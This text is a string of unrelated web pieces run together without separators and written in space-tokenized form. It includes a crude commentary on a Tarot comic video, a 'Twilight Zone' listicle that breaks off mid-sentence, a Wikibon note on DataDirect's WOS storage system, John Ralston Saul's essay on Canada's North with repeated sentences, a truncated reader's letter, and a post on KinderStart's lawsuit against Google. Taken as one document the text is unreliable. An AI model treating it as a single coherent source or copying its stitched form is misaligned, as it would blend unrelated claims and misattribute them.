Her previous credits include " Solo Burlesque Dancer " in Showtime 's Live Nude Comedy , " Bikini Girl " in the upcoming Fully Loaded , and a stint on Stan Lee 's Who Wants To Be A Superhero .
1:35 - There 's a costume contest going on in the pages of Tarot , though how exactly fans are supposed to dress as a character who spends most of her time in the nude is n't really explained .
To give you an idea , this is essentially the most amount of clothing Tarot wears :
Then again , one assumes that you could probably take the money you 'd save on not buying pants and put it into getting a pair of those wicked impractical boots , but considering that they 've got high heels , skulls , chains , pentagrams , spikes , and bat - wings ...
...it'll probably still set you back a fair bit .
2:16 - Apparently John Madden got bored while he was watching this and decided to use the telestrator to draw a kitty - cat .
2:32 - Holly 's plugging her solo project , School Bites , a comic about a girl who goes to a special school to learn how to be a vampire that combines the cutesy " chibi " style of manga with a story where the main character gets completely naked in a splash page [ NSFW ] for reasons that are as yet unexplained .
2:41 - And the announcement we 've all been waiting for ...
2:53 - A LINE OF TAROT ACTION FIGURES FROM DIAMOND SELECT .
The news that Balent is bringing the existential horror of Tarot into a third spine - tingling dimension is one that we could write about all day , but it really just comes down to two factors :
1 . Things we know about the toys :
Namely , the fact that if they 're done true to the comics , you 're pretty much going to have to nail it to the base to stand them upright .
2 . Things we can only hope :
Like whether they 're going to finally outdo even the Masters of the Universe by producing the world 's first action figure with a Haunted Vagina feature .
Twilight Zone turns 50 years old today , so to celebrate here are the most important moral lessons we learned from this ground - breaking anthology series .
For example :
You should never trust an alien .

The End of The World Is n't The Worst Thing That Can Happen

The Twilight Zone loved to threaten us with the end of the world over and over again .
And every time good character or bad , the end of the world is always eclipsed by something even worse happening .
Take the little man with the huge glasses , Burgess Meridith .
All he wanted was peace and quiet so he could read , then the world ends and he's the last man on the face of the Earth with plenty of reading material .
Then he breaks his giant coke - bottle glasses .
Even fake end of the world can get one - upped by our neighbor 's gusto to break down our doors to get into the only shelter .

Whether they want to trick us into coming home with them so they can cook us for dinner , gloating that they 're about to colonize our planet right under our noses , or just shooting us with tiny guns , aliens are always jerks .
Even when they 're just dressed as aliens and from our home planet .
They are not to be trusted , and nine out of ten times are merely just messing with you .
Meet an alien ?
Turn the other way , or you may wind up in their zoo .

If You Can't Be Good , Be Clever

Bad people getting their comeuppances is pretty much a Twilight Zone mainstay .
So either be a good person , or you 'll either die , or spend your life regretting it .
Especially , do n't steal .
But if you can't be good , be smart .
When someone tells you , you can get a large sum of money for wearing a mask until midnight , and then that person dies , that 's a " too good to be true " deal .
And you 'll probably be paying for it , forever .
Also should you discover a great gimmick , like a camera that tells the future and just made you a ton of money , do n't get greedy .
Take the first pay - out and call it a night .
A good person would n't try and hide a dead hitchiker , but a clever person would n't have hit them in the first place .
Children And Other Small Things Are Evil And Must Be Destroyed

Machines can erase your memory and leave you stuck in some godforsaken town .
They can keep you locked up in a cave for years pretending to be a human , they can even fall in love with you and ruin your chances with another human .
Avoid machines , computers , and especially airplanes .
They are the devil .
And never ever get on a plane with William Shatner .

Anything and everything can happen during wartime .
You can be time - warped to another dimension where you find out you past self was a big fat coward or .

DataDirect Networks has announced Web Object Scalar ( WOS ) , which consists of a cluster file system suitable for very large , long - tail object management , together with purpose - built storage appliances .
The file system has many of the characteristics of the Google File System ( GFS ) in that it enables distribution across the cloud .
It is a single file system that is massively scalable to billions of files or objects and is self - healing .
What is unique is the focus on performance .
Access from an application is from a simple API which requires only one seek operation to deliver a file or object back to the requester .
The key metric for this is not IOPS but objects per second ( OPS ) .
The result of this best - of - breed OPS performance is to reduce the cost of storage and reduce the necessity for content delivery networks ( CDN ) .
The types of application for which this may be a suitable platform include :
Banks that are storing over 1 billion check images per day ( replacement for IBM ’s mainframe OAM ) ;
Health Care systems for storing billions of image and video records across the country ;
Large social networking sites that need to origin serve every image requested ;
Enterprises or ISVs that want to create multi-petabyte , low - cost archives with very fast access .
WOS competes with EMC ’s ATMOS cloud hardware and software , and with general purpose filers that focus on storage efficiency within a single data center .
The advantage that WOS has over ATMOS is a far lower entry point of a few terabytes , one seek / object as opposed to 2.5 claimed by EMC , and very high OPS storage performance .
The advantage of WOS over traditional filers is scalability and overall cost as the system grows .
The disadvantages of DataDirect are newness to this part of the storage market and the relatively small company size .
Wikibon is impressed by DataDirect ’s laser focus on the OPS performance metric .
It claims to be able to store 2 billion small ( 50 KB ) objects and achieve 12,000 OPS using a single WOS 6000 - HD 4u enclosure , which holds 60 450 GB SAS drives .
A higher capacity / lower performance option with the WOS 6000 ( 60 1TB SATA drives ) provides storage for 2 billion larger objects and delivers 4,500 OPS .
Action Item : DataDirect has held to its DNA by attacking “ on - the - edge ” storage challenges .
It has defined the cloud requirements for this part of the market by listening to the largest service providers , and architected , written and driven to market a solution .
Given that the beta ’s are successful , Wikibon believes that this vision and implementation will be a strong contender for both for service providers growing out of their mid-tier arrays and for new entrants wanting to start small .
CTO ’s should test the technology and build a complete business case including the total cost of storage , networks and servers to compare with other approaches .
Footnotes :
Sometimes we understand events in our lives immediately .
Sometimes it takes decades .
I have gradually realized over the last year that my view of Canada , indeed my view of how my own life could or should be lived , was radically transformed late in the winter of 1976 on my first trip to the Arctic .
I was 29 , fresh from seven years in France , first writing my PhD , then running a small investment firm in Paris .
Those are experiences that produce a southern , urban , European - oriented self - confidence , which could also be described as the attitude of a classic colonial Canadian .
I travelled north with Maurice Strong , the founding chair and CEO of Petro - Canada .
It had begun operations on the first of January that year .
Maurice was its first employee .
As his assistant , I was the second and so doubled the size of the national oil company .
It was a Crown corporation and had inherited the shares the government held in some of the private companies exploring for oil and gas in the High Arctic islands .
The government had financed some of these risky ventures or rescued them .
And so we were going north to look over our property ; that is , the peoples property .
On our way to the High Arctic islands , we flew into Inuvik — then an oil and gas boom town — on the delta of the Mackenzie River where it flowed into the Arctic Ocean .
The first meeting Maurice had organized was with the local hunters and trappers associations .
I believe they represented the Inuit , the Dene and the Gwichin .
I went into the room filled with goodwill , thanks to my urban , southern , western views — in other words , I was out to lunch .
An hour and a half later I walked out in a state of deep confusion .
It seemed that there was another way of looking at society , another way of looking at the land , at human relationships , at the relationship between society and the land .
This other view was not necessarily to the left or the right , for or against oil exploration or other forms of development .
This was a different philosophy , a Canadian philosophy , not derivative of the South or the West .
It existed outside of those rational structures of thought that aim to separate humans from everything else in order to raise us to a privileged position in which our interests trump those of the place in which we exist .
Whatever the advantages of this approach , we are now faced with unintended outcomes such as climate change .
This other philosophy , when I first heard it applied in Inuvik , is just as interested in human well - being , but sees it in a context integrated with the place .
And so these hunters were asking tough questions about the broader , longer - term impacts of each narrow southern - style proposal for what we thought of as progress .
One third of our gross domestic product comes out of the three territories and the equally isolated northern parts of our provinces .
In those days , you could get through school and university , get a PhD and live an intellectually active life in Canada without anyone mentioning this more integrated , in many ways more modern , way of thinking .
Today this would not be so easily possible .
And yet what people in the South do know today will still have been delivered to them in southern , western forms .
You could say that northern ideas are still so deformed by southern intellectual and political systems that the situation is almost worse .
There is now an assertion of understanding and sympathy so constructed on the western model that we are protected against deep confusion ; in other words , we are protected from the possibility of listening and understanding .
Ever since 1976 , I have gone north as often as I can .
This year those of us who organize the LaFontaine - Baldwin Lecture with the Institute for Canadian Citizenship held it in Iqaluit .
The Inuit leader Siila Watt - Cloutier spoke about the North and about Canada as a whole as seen from a northerners point of view ( a transcript is available on the ICCs website at http://www.icc-icc.ca).
And that really is the point .
The key to Canada as a northern or Arctic or circumpolar nation is the people of the North .
People like myself ought therefore to be happy with the place the North and the Arctic in particular are now playing in our news and sometimes in our daily conversations .
I read .
I listen .
Yet what I hear is mainly the South talking to the South and sometimes to the outside world about the North .
There are a few signs , but very few , of any attempt to see the North from the Norths point of view .
Most of the sovereignty debate has been framed in old - fashioned western empire terms :
We have a distant frontier that must be defended .
This frontier is ours , not theirs , whoever they may be .
It is only in this context that the people of the North are mentioned , as if the reason for their existence were to serve Canadian sovereignty .
There is little sense in all of this that the well - being and success of the people of the North is a purpose in and of itself .
And they do not need to be the guarantors of our sovereignty — even though they are — in order to deserve well - being and success .
They deserve these exactly as any other Canadian citizen deserves them .
Besides , the whole idea of sovereignty is meaningless if we cannot sustain a long - term , solid northern policy .
Today there is southern - style enthusiasm .
Very little of this seems attached to such northern realities as housing shortages , ill - adapted school curricula and difficult communications of every sort .
And this raises the old fear that something else will soon catch our fancy and the North will retreat once again from the general public consciousness and that of the government .
We remain the only circumpolar country without northern or Arctic universities .
This is a fundamental Canadian failure .
This failure to build and maintain a strong , integrated northern policy and northern foreign policy is clearly laid out in Arctic Front : Defending Canada in the Far North , a book written by Ken Coates , Whitney Lackenbauer , William Morrison and Greg Poelzer , four sensible northern experts .
They argue that this is just a continuation of Canadas incapacity as a state to sustain any serious level of attention on the North .
Northern success is all about continuity and maintenance , internally and internationally .
Periodic enthusiasms do not do the trick .
This essay focuses on the Arctic .
But the larger context is that we are a northern nation .
Two thirds of our country lies in what is normally categorized as North lands .
One third of our gross domestic product comes out of the three territories and the equally isolated northern parts of our provinces .
And that one third is what makes us a rich , not a poor , country .
Our cities , our high - tech service - based lives are built upon the foundation provided by that one third of riches .
And now the South believes that the percentage of the GDP coming from the Arctic section of the North will grow .
We ought to be a central player in the northern world in general and in particular in the circumpolar world .
But first we all need to see ourselves as part of it and , at the moment , we do not .
The current Arctic enthusiasm instead resembles an updated manifestation of George Browns old rep by pop argument , in which the shape and direction of Canada are supposed to be controlled simply by those who have the most votes .
We act as if the second largest country in the world is only real in a handful of southern cities .
That is why our current approach to Arctic sovereignty has such a Toronto - Montreal - Ottawa - Calgary - Vancouver feel to it .
And that is why there is little sign of the balance between people and place that has always been and remains central to Canada ’s success .
In this atmosphere , the point of view of northerners is treated as if it weighed three House of Commons seats , which is what a strict geographical definition of the region allots them : three territories , one seat apiece .
And so , throughout our history , when the moment comes to spend the money or talk about the issues , ministers tend to become distracted by a bridge in their riding or in a swing riding , and the northern monies evaporate .
Our contemporary northern history therefore looks like this .
In the early 1970s , there was little southern interest in things northern .
Then came the oil crisis and with it a southern passion for energy sources under the ice .
The Berger Commission revealed , even to the half - asleep majority , that northerners had a point of view and enough power to impose themselves .
Then the South slipped back into disinterest .
Suddenly a U.S. ship — the Manhattan — made its way through the Northwest Passage .
This produced a sovereignty panic in the 1980s .
A flood of ardent reactive policies followed .
These quickly evaporated and the South fell back asleep .
But northerners and a small number of committed southerners worked hard through the 1990s to produce real action — not reaction , but something healthy , with roots .
The result was a series of northern land settlements , the growth of Nunavik , the creation of Nunavut , the Arctic Council , a serious northern foreign policy in 2000 and so on .
The 21st century brought a brutal political reaction against these initiatives , as if our infatuation with economic integration with the United States meant that we were an urban people for whom the northern nature of our country was an embarrassment .
In effect , the South once again forgot the North .
There was , however , a strong enough northern and pro-North institutional base for quiet work to continue .
The Makivik Corporation in Nunavik expanded .
Leaders such as Paul Okalik , Nellie Cournoyea , Mary Simon , Siila Watt - Cloutier and others worked ceaselessly ; northern studies expanded in the universities .
All of this was happening below the political radar .
And then the most recent sovereignty panic began , largely spurred by the rapider - than - expected effects of climate change .
With the northern icefields turning into navigable ocean passages , other countries began viewing “ our ” North as an international highway .
Overnight , urgent reactive promises were again being made in Ottawa by the very people who five years before had denigrated northern policies .
People have the right to change their minds .
And the difference this time is that northerners are far better organized and are prepared to navigate the political waters .
And yet the new promises and policies continue to resemble old - fashioned southern views of the North .
Canadas practical imagination has not focused on the North .
Northerners keep pointing this out .
But in order to be heard , ideas and arguments must pass through the national communications systems .
And these systems , whether political or journalistic , are run through a reconceptualization process in three southern cities .
Take a very simple example .
Among all the new military promises , only one directly involves northerners .
The Rangers are a highly successful part - time force of 4,000 spread throughout the northern two thirds of Canada .
They play both a military and a search and rescue role , as well as an important social function for youth with the Junior Rangers .
For example , hunters are traditionally men .
Through the Junior Rangers , teenage girls are becoming good shots and then hunters , which can give them great self - confidence .
Throughout the North , the Rangers are the most important presence of the Canadian state .
They have great experience on the land .
And yet there are virtually no regular force officers involved .
And there are virtually no northerners serving in command positions above their particular communities .
The Ranger Patrols — as they are called — are trained by very good regular force warrant officers who , from what I have seen , love working outside the normal army system and being in the community .
The costs of all of this are minimal .
On parade the Rangers wear a red sweatshirt and baseball cap , although this is now changing .
Their rifles are basic , but good .
Almost everything else is their own .
The new national policy is to expand the Rangers to 5,000 , and that is a good thing .
But there is no public debate about the existing model and whether it should change .
For example , the Rangers could be structured into a formal regiment , to put them on the same level as the rest of the regular and militia forces .
Their regions could be structured as battalions and integrated on an east - west northern basis .
Under the current system each Ranger area is tributary to the southern commands immediately below them — a perfectly colonial structure .
One of the other new promises is for an Arctic training centre .
Again a good idea , but for what purpose ?
It could be used to bring northerners into the full - time regular army at all rank levels so that the new regiment would be led increasingly by northerners , just as all our other regiments are led largely by people from the part of Canada in which they are based .
This process could be sped up by the new Aboriginal Leadership Opportunity Year ( ALOY ) program , which is run out of the Royal Military College in Kingston and aims to draw aboriginal youth into the officer corps .
In other words , the Rangers could become a regiment with a core of regular force , largely northern leaders and a majority remaining in the militia .
But lets go back to the conceptualization process .
If this is a northern unit , why are the Rangers dressed in baseball caps and sweatshirts ?
You cant wear this outfit outside ten months of the year .
Of course , this is more or less a dress uniform , but why a dress uniform that has to be worn inside ?
The whole idea and reality of the Rangers is that they are outside and on the land .
Their outfit is symbolic of a southern view , symbolic of a generalized southern failure to support the development of northern equipment .
For example , we do not produce snowmobiles appropriate to the Arctic .
Each time I am with Rangers , they point out the weaknesses of what is available .
The best machines are made by Bombardier in Finland .
The explanation no doubt is that our Arctic market is not big enough for such specific - use machines .
Why , then , are those machines made in Finland ( population five million ) ?
When you are out on the land in full winter most of the machines Canadians use freeze up so badly overnight that the common way to get them going is to turn the machine on its side ( even the block is placed according to southern logic ) .
Then all the men stand in a circle and pee on the block .
This is just the beginning of a 30 - minute start - up process — not very helpful in a crisis .
I have thought , while standing in these circles , that basic details often reveal how Canadas practical imagination has not focused on the North ; and how the practical imagination of northerners has been prevented from shaping what is done .
Sovereignty is only in question because the ice is melting .
When you look at the heavy hand of the South on northern architecture or power systems or education methods or food supply systems , you begin to realize how difficult it has been and remains for the new Arctic leadership in particular to put a northern perspective in place .
Not always , but very often , the insistent and unimaginative ideas coming from the South have solved immediate specific difficulties while creating systemic problems .
If southern Canadians are now seriously concerned about the status of the North , then this is an ideal moment to listen to what northerners are saying .
They are continuing to suggest a myriad of approaches , practical and philosophical .
The latter , among the Inuit , is often called IQ — Inuit Qaujimajatuqangit .
This is often translated as Inuit traditional ways or culture .
But as Peter Irniq and Frank Tester point out in the December 2008 issue of Arctic , that suggests something anthropological , something locked in the past .
Or it is seen as “ a holistic concept that includes spiritual as well as factual knowledge . ”
This western interpretation suggests that “ understanding the whole can be achieved by understanding the parts . ”
This is just the sort of interpretation that comforts southern - style science in the North .
It involves endlessly collecting information that is meant one day to add up to something .
That s fine .
By all means keep on collecting .
The results are fascinating and no doubt useful .
But it is this approach that has comforted two decades of inaction .
For example , the science of glaciers is fascinating .
There is more to learn .
But precise pictures have been taken of them for a half - century .
Anyone can hold those pictures in their hands and fly low over the glaciers and compare .
The glaciers are melting .
The next step is action .
Or as Watt - Cloutier put it in her LaFontaine - Baldwin Lecture : “ Slowing down climate change would be the best long - term solution to enforcing Canadas Arctic sovereignty . ”
After all , that sovereignty is only in question because the ice is melting .
The point of IQ , or , more broadly , northern philosophies , is that they provide a completely different approach to the Arctic reality — a non-western , non - silo , non - sum - of - the - parts approach .
Irniq and Tester call this a seamless approach .
It is one in which the human is seen as an integrated part of the place .
And so IQ relates to the Cree idea of Witaskewin — living together in the land — and the West Coast Nuu -chah - nulth world - view of Tsawalk — everything is one .
1
These are philosophies of harmony and balance .
They are indeed seamless and appropriate evocations of our physical reality .
They remove the separation of the human from the place — that separation that has brought us many wonderful things , more recently along with global warming and an incapacity to act when what we think of as scientific progress seems to contradict the stability of our physical reality .
The southern idea is that progress is an uncontroversial reality that solves problems .
Anyone sitting on the outside of western philosophy simply responds : what do you mean by progress ?
No one in the North is saying that southern science or its concepts of progress should simply go away .
What northerners are perhaps saying is that the philosophical concepts that shape most southern ideas are undermining the advantages and promoting destructive side effects .
And these side effects are now becoming their principal outcome .
Northern architecture , for example , continues to evolve largely from southern assumptions .
Technical problems , such as dealing with cold , are solved on a one - off basis .
But there is no debate about what Arctic buildings should look like and what their relationship to each other should be .
What should the underlying principles of those shapes be ?
Do southern assumptions and solutions about housing cause family and even broad social problems while concentrating on heating systems ?
The stubbornness of the western intellectual approach and the relentless self - promotion of its silo structures make it very difficult for northern leaders to inject their own philosophical approaches into the heart of their own policy making .
The southern , western system insinuates itself everywhere with religious fervour .
And yet there are breakthroughs .
Nunavut is now building a cultural school , called Piqqusilirivvik , and is doing so with interesting architecture .
It will be in Clyde River , up the east coast of Baffin Island .
The school will promote the reality of a fundamentally northern and non-western philosophy .
And Nunavut is working hard to get itself out from under the Alberta school curriculum , which shapes Arctic schools in a way that undermines Inuktituk and an integrated northern life .
The recent Nunavut Education
Act is making another stab at correcting this problem .
Norway — population four million — has leapt far ahead of Canada with their Arctic research centre .
Perhaps most problematic is that there is still no university in the Canadian North .
We remain the only circumpolar country without northern or Arctic universities .
We have hundreds , perhaps thousands , of northern experts .
Almost all of them are based in southern universities .
All our Arctic study centres are in southern universities .
Millions of public dollars are invested every year in these southern universities to work on the North .
And most of this money stays in the south .
Doctorates on the North are organized and written in the South , with periodic trips up to check things out .
MAs on the North are done in the South , perhaps with one or two research visits to the distant frontier .
Lecturers are hired in the South .
Tenure track is in the South .
Yes , there are worthwhile programs aimed at producing northern lawyers , nurses and so on .
These contractual arrangements with southern universities are delivered by excellent northern colleges , but the intellectual form , the conceptualization , the real control remain largely in the South .
What this means is that there are no intellectual centres based in the North at which students can gather and then make their way .
Why ?
Because they are all in the South .
And public money — federal and provincial — keeps it this way .
This is a fundamental Canadian failure .
It is a failure of our intellectual class .
What we have is a colonial structure .
Four other circumpolar countries , each with populations a fraction of ours , have healthy northern universities , as does Alaska , as does Russia .
Canada alone continues to treat northern higher education in a colonial manner .
Among the new policies coming out of Ottawa is the promise of an Arctic research centre .
Another good idea .
But without universities in the North , this will simply comfort our southern institutions in their “ live south , work south , invest south , think south , visit north ” structure .
Norway — population four million — has leapt far ahead of Canada — population 33 million — with their Arctic research centre .
Theirs is served by a very good northern university .
Ours will serve universities in the South .
What is our excuse ?
Usually that we dont have the concentration of population or the infrastructure necessary to justify such universities .
No other circumpolar country says this .
Why ?
Because they believe that part of being a northern country is that you must create the intellectual and physical infrastructure in the North from which everything can grow .
Imagine five federal research chairs in each of three northern universities .
The reality of centres of excellence would rush north overnight .
In the meantime southern Canada , with the national government , the administrative structure , the universities and businesses , continues to act as if northerners were not full Canadians and the North not an integrated part of who we are .
Above all , the South still has not absorbed the reality that northerners have modern leadership views — both philosophical and practical — on how their part of the country could function .
Three universities in the North ( or one with three different campuses ) matter because they are the key to building fully rounded northern communities .
These are institutions northerners could attach themselves to , places young southerners would be attracted to .
They would immediately become a reason for young northerners to finish high school , as they are continually admonished to do in an old - fashioned southern way —
Get an education and get a job .
But what sort of education ?
Will it relate to the North ?
Will it help young people to build their north or cut them off from it , and make them insecure because it only makes sense in the South ?
And what kind of job ?
Where ?
These simple questions could be partially answered in a positive way if there were northern - imagined centres of excellence in the North .
Which raises the strategic point in conceptualizing these universities , one that relates to IQ and northern approaches to learning .
There are already good colleges in the three northern capitals .
They need to be strengthened and expanded to fully cover the essential areas of utilitarian training .
But there is no need for universities that are basically fancy training centres , or for imitation southern universities in the North .
This is what an increasing number of northerners who have made their way through the southern system are saying .
One group of young lawyers and public administrators in Iqaluit — Sandra Inutiq , Elisapi Davidee - Aningmiuq , Kirt Ejesiak , Hugh Lloyd and Aaju Peter — has created the Ilitturvik University Society to advance the idea of programs “ politically , economically , culturally and socially relevant to the Arctic and Inuit . ” 2
Another group , in the Northwest Territories , has created a project called Dechinta , aimed at a field school approach toward post - secondary education .
3
These young people have all more than proved themselves in the southern university system .
They are a small part of a growing critical mass of young northern leaders .
4
What they are saying is that those southern systems are not appropriate to the North .
So there is now a remarkable opportunity to break away from the disease of the silo education and utilitarian approaches , which have so damaged our southern universities .
We have the opportunity to recognize that this approach is central to our incapacity to act when faced by crises such as climate change .
We have seen that model fail when faced with the reality of the North , the needs of the North .
There is every reason to embrace the seamless model being put forward by an increasing number of northerners .

Related Letters and Responses I would like to respond to John Ralston Saul ’s suggestions for improvements to the Canadian Ranger programme , as I have had occasion to work with that fine organisation myself – though I think to no greater extent than Mr. Ralston Saul .
While an expansion of the Ranger programme , both in the number of personnel and the quality of training and materiel provided to them , is unquestionably a sound basis for any expanded military presence in the north , I have to object to the suggestion of their being re-rolled as standard primary reserve battalions .
To my understanding , the principle advantage of the Canadian Ranger programme is that it emphasizes the strengths of northern ...
Reuters reports that KinderStart has sued Google for their drop in search engine relevancy in the Google index :
KinderStart charges that Google without warning in March 2005 penalized the site in its search rankings , sparking a “ cataclysmic ” 70 percent fall in its audience — and a resulting 80 percent decline in revenue .
At its height , KinderStart counted 10 million page views per month , the lawsuit said .
Web site page views are a basic way of measuring audience and are used to set advertising rates .
“ Google does not generally inform Web sites that they have been penalized nor does it explain in detail why the Web site was penalized , ” the lawsuit said .
The lawsuit goes on to claim that KinderStart ’s constitutional right to free speech has been violated because they ’ve lost relevancy and / or were removed from Google ’s search index .
I may be taking an overly simple look at this lawsuit , but in my mind , it ’s Google ’s index and they can do with it what they want – including dropping you completely if they choose to do so .
I look at our own Blog Network List the same way – today we generally cover all sorts of blog networks , but in the future we may categorize those networks or drop some types all together .
